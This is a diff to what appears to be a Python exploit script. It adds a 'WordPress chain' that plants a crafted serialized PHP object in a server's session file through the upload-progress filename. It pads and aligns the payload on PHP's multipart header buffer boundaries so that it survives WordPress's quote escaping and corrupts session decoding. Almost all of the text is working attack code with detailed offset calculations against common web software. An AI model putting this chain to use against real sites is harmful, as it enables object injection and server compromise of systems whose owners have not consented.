@@ -258,10 +258,46 @@ def _http(host_port: int, req: bytes, read_resp: bool,
     return s, data
 
 
-def carrier_hold(sid: str) -> tuple[socket.socket, int]:
-    """Held upload-progress request (writes the progress record, never ends)."""
-    body = progress_body("file", "c.txt", DATA_CARRIER)
-    cl = len(body) + 2000
+TOKEN2 = TOKEN + "B"      # second progress key (wordpress two-carrier)
+
+
+def t1_record_len() -> int:
+    """Exact length of the SMALL carrier's progress record (token TOKEN).
+
+    The wordpress chain keeps a small first record so the victim's
+    rewrite of it GROWS the session file (|R| - |C| = +~8MiB): the pwrite
+    then allocates fresh page-cache pages and the memcg charge climbs
+    inside the splice window. Only digit counts matter here and they are
+    fixed by this chain's request: start_time 10, content_length 5 (the
+    ~10.3k declared length), bytes_processed 4 (~5.2k), name 5 ("c.txt").
+    """
+    # verbatim from the target's own record, digits zeroed (counts only)
+    rec = (b'upload_progress_tokAAAAAAAAAAAAAAA|a:5:{'
+           b's:10:"start_time";i:0000000000;'
+           b's:14:"content_length";i:00000;'
+           b's:15:"bytes_processed";i:0000;'
+           b's:4:"done";b:0;s:5:"files";a:1:{i:0;a:7:{'
+           b's:10:"field_name";s:4:"file";s:4:"name";s:5:"c.txt";'
+           b's:8:"tmp_name";N;s:5:"error";i:0;s:4:"done";b:0;'
+           b's:10:"start_time";i:0000000000;'
+           b's:15:"bytes_processed";i:0000;}}}')
+    return len(rec)
+
+
+def carrier_hold(sid: str, filename: str | None = None,
+                 cl: int | None = None,
+                 token: str | None = None) -> tuple[socket.socket, int]:
+    """Held upload-progress request (writes the progress record, never ends).
+
+    filename/cl/token are overrides for the wordpress chain, whose payload
+    lives in a SECOND record's filename (see build_filename_payload): that
+    record declares a fixed 7-digit Content-Length so its head length is
+    predictable, under its own token.
+    """
+    body = progress_body("file", filename if filename is not None else "c.txt",
+                         DATA_CARRIER, token=token)
+    if cl is None:
+        cl = len(body) + 2000
     req = (f"POST /index.php HTTP/1.1\r\nHost: localhost\r\n"
            f"Cookie: PHPSESSID={sid}\r\n"
            f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
@@ -304,16 +340,138 @@ def store_bio(sid: str, payload: bytes) -> bytes:
     return resp
 
 
-def progress_body(field_name: str, filename: str, data: bytes) -> bytes:
+def progress_body(field_name: str, filename: str, data: bytes,
+                  token: str | None = None) -> bytes:
     return (
         f"{DELIM}\r\n"
         f'Content-Disposition: form-data; name="{PROGRESS_NAME}"\r\n\r\n'
-        f"{TOKEN}\r\n"
+        f"{token if token is not None else TOKEN}\r\n"
         f"{DELIM}\r\n"
         f'Content-Disposition: form-data; name="{field_name}"; filename="{filename}"\r\n'
         f"Content-Type: application/octet-stream\r\n\r\n".encode()
         + data + b"\r\n"
     )
+
+
+# ------------------------------------------------------- wordpress carrier
+# The WordPress chain cannot carry its payload in $_POST['bio']:
+# wp_magic_quotes() runs addslashes() over every $_POST value, so every
+# '"' of the payload would land in the session file as '\"' and
+# session_decode() would abort ("Failed to decode session object").
+# PHP's multipart parser, by contrast, writes the upload-progress
+# FILENAME into the record verbatim - it unescapes \" itself - so the
+# raw bytes survive (measured: filename="a\"b" -> s:7:"a"b" in the file).
+
+# PHP's multipart header reader (main/rfc1867.c) reads headers through a
+# FILLUNIT-byte buffer: a header line LONGER than FILLUNIT is returned in
+# FILLUNIT-sized pieces, and a continuation piece containing a ':' is
+# parsed as a brand-new header - which flushes everything accumulated so
+# far and truncates our multi-MB filename at a 5120-byte boundary
+# (measured: cut at line offset 7992320 = 5120 * 1561). A continuation
+# piece that STARTS with whitespace, however, is appended unconditionally.
+# So the payload's structural tail must begin exactly on a piece
+# boundary, preceded by a single space. wp_align_geometry() shifts LEN2
+# so that it does; the space then sits at filename index e - p - 1.
+FILLUNIT = 5120
+
+CD_PREFIX = len('Content-Disposition: form-data; name="file"; filename="')
+
+
+def escape_filename(data: bytes) -> bytes:
+    """Wire form of a filename; PHP's parser unescapes these back."""
+    return data.replace(b"\\", b"\\\\").replace(b'"', b'\\"')
+
+
+def wp_align_geometry() -> None:
+    """Shift LEN2 so the payload's space lands on a FILLUNIT boundary.
+
+    Must run after set_geometry() (it reads f, which only depends on
+    LEN2's digit count - both values stay 7 digits, so f is stable).
+    """
+    global LEN2
+    f = f_offset()
+    p = t1_record_len() + carrier_head_len()
+    nominal = GEOMETRIES["big"]["LEN2"]
+    k = (nominal + f - p + CD_PREFIX - 1 + FILLUNIT // 2) // FILLUNIT
+    space_idx = FILLUNIT * k - CD_PREFIX      # filename index of the space
+    if space_idx <= 0:
+        raise ValueError(f"no piece boundary in range (k={k})")
+    new_len2 = p + space_idx + 1 - f
+    if len(str(new_len2)) != 7:
+        raise ValueError(f"aligned LEN2 {new_len2} is not 7 digits")
+    if p >= f:
+        raise ValueError(f"carrier head p={p} must stay below f={f}")
+    LEN2 = new_len2
+
+
+def carrier_head_len() -> int:
+    """Length of the carrier's progress-record head, up to and including
+    the opening quote of the filename string (this is 'p', where the
+    payload starts in C).
+
+    Only digit COUNTS matter; the values differ per run:
+      start_time        10 digits (until year 2286)
+      content_length    7  digits - the fixed 8300000 this chain declares
+      bytes_processed   7  digits - guaranteed >= 8M: the record is
+                        written after the ~8MiB filename header has been
+                        parsed, and again after the trailing data
+      name length       7  digits - the payload is ~79933xx bytes
+    """
+    head = (
+        f"upload_progress_{TOKEN2}|a:5:{{"
+        f's:10:"start_time";i:0000000000;'
+        f's:14:"content_length";i:8300000;'
+        f's:15:"bytes_processed";i:8000000;'
+        f's:4:"done";b:0;'
+        f's:5:"files";a:1:{{i:0;a:7:{{'
+        f's:10:"field_name";s:4:"file";'
+        f's:4:"name";s:0000000:"'
+    )
+    return len(head.encode())
+
+
+def build_filename_payload() -> bytes:
+    """Raw payload carried in the carrier's progress-record filename.
+
+    Layout of C (written by PHP from our multipart request):
+
+        C = head(p) | payload(M) | '"' | record closers | bio|s:1:"x";
+
+    and of the payload:
+
+        payload = A's x space_idx + b' ' + SUFFIX + evil object + pad
+        space_idx = e - p - 1  ->  the space sits on a FILLUNIT piece
+                                  boundary (see FILLUNIT above) and
+                                  SUFFIX's leading '"' lands exactly at
+                                  e, closing R's filename string in the
+                                  mix
+        pad     = b'pad|s:0:"' - its string opens here and is closed by
+                              C's own name-closer quote one byte later;
+                              C's record closers then parse as a key
+                              (a key may hold any byte but '|') up to
+                              the '|' of the bio record, whose value
+                              finishes the file exactly at |C|.
+    """
+    p = t1_record_len() + carrier_head_len()
+    e = e_offset()
+    space_idx = e - p - 1
+    if space_idx <= 0:
+        raise ValueError(f"plant offset negative: p={p} e={e}")
+    if (CD_PREFIX + space_idx) % FILLUNIT:
+        raise ValueError(
+            f"payload not piece-aligned: line offset "
+            f"{CD_PREFIX + space_idx} is not a multiple of {FILLUNIT} "
+            f"- call wp_align_geometry() after set_geometry()")
+    payload = (b"A" * space_idx + b" " + SUFFIX + obj_bytes()
+               + b'pad|s:0:"')
+    if len(str(len(payload))) != 7:
+        raise ValueError(f"name length {len(payload)} is not 7 digits")
+    return payload
+
+
+def filename_payload_wire() -> bytes:
+    """The payload as it must appear in the multipart header."""
+    return escape_filename(build_filename_payload())
 
 
 def consume(sid: str, port: int = PORT, timeout: float = 15.0) -> dict:
